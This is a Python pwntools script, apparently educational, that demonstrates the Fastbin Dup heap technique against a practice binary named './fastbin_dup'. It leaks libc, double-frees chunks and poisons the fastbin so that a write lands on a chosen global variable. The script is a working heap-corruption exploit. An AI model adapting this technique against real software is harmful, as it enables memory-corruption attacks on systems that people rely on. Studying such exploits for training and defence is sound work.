#!/usr/bin/env python

"""
This Python script demonstrates how to implement an arbitrary write primitive
using the Fastbin Dup technique against the `./fastbin_dup` ELF.
"""

from pwn import *

BINARY = './fastbin_dup'
LIBC = './libc.so.6'
ADDR = 'localhost'
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)

# Global index variable to keep track of allocated chunks
INDEX = 0


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    if args.PWNDBG:
        context.log_level = 'debug'
        context.terminal = ['tmux', 'splitw', '-h']
        return gdb.debug(elf.path, gdbscript='''init-pwndbg''')

    else:
        return remote(ADDR, PORT)


def malloc(io, size, data):
    global INDEX

    io.send("1")
    io.sendafter("size: ", str(size))
    io.sendafter("data: ", data)
    io.recvuntil("> ")

    INDEX += 1
    return (INDEX - 1)


def free(io, index):
    io.send("2")
    io.sendafter("index ", str(index))
    io.recvuntil("> ")


def solve():
    io = conn()

    io.recvuntil("puts() @ ")
    libc.address = int(io.recvline(), 16) - libc.sym.puts
    log.info("puts() found at: " + hex(libc.sym.puts))
    log.info("libc base found at: " + hex(libc.address))

    """
    Overwite `username` item in `user` struct to contain a fake chunk `size`
    field.
    """
    username = p64(0) + p64(0x31)
    io.sendafter("Enter your username: ", username)
    io.recvuntil("> ")
    io.timeout = 0.1

    chunk_a = malloc(io, 0x28, cyclic(0x28, n=8))
    chunk_b = malloc(io, 0x28, cyclic(0x28, n=8))

    # Conduct a double free to duplicate free chunks in the fastbin.
    free(io, chunk_a)
    free(io, chunk_b)
    free(io, chunk_a)

    """
    Malloc the duplicate chunk and write a fake forward pointer to the location
    of our target, creating a fake fastbin chunk.
    """
    fastbin_dup = malloc(io, 0x28, p64(elf.sym.user))

    """
    Malloc fastbin chunks from the fastbin until we malloc the fake target
    chunk. Write to the contents of the target variable.
    """
    malloc(io, 0x28, cyclic(0x28, n=8))
    malloc(io, 0x28, cyclic(0x28, n=8))
    malloc(io, 0x28, "GETPWNED")

    io.interactive()


if __name__ == "__main__":
    solve()
